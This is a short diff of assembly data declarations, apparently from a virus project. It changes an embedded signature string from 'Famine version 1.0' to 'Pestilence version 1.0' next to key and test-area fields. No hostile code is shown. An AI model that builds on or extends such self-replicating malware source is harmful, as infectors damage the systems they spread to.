@@ -29,7 +29,7 @@ aligner2: db `00000000`
 key: db `0000000000000000`
 test_area: db `AAAAAAAAAAAAAAA`,0
 
-signature: db `Famine version 1.0 (c)oded by ndombre-agadhgad`,0
+signature: db `Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA`,0
 
 environ: db `00000000`
 
